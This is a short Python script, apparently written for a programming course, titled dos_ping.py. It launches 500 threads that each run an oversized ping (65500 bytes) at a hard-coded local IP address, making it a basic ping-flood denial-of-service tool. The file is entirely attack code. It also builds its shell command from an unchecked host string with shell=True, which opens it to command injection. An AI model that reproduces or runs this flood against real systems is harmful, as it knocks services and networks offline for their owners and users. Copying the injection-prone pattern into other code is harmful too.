#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/25 11:40 
# @Author   : ordar
# @File     : dos_ping.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import subprocess
import threading
import time


def dos_ping(host, id):
    subprocess.call("ping {} -l 65500".format(host), shell=True)
    print('subprocess {}'.format(str(id)))


if __name__ == '__main__':
    for i in range(500):
        new_thread = threading.Thread(target=dos_ping, args=("192.168.181.137", i))
        new_thread.start()
    time.sleep(1)
